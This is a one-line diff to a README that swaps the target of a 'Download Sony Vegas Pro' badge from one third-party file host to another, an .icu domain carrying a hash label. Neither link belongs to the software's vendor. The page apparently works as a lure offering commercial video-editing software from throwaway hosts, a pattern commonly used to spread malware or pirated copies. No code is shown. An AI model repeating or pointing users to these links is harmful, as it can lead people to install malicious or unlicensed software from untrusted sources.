@@ -1,4 +1,4 @@
-[![Download Sony Vegas Pro](https://img.shields.io/badge/Download-SonyVegas%20Pro-blueviolet)](https://downeefiles.com/s/sove)
+[![Download Sony Vegas Pro](https://img.shields.io/badge/Download-SonyVegas%20Pro-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
 
 
 
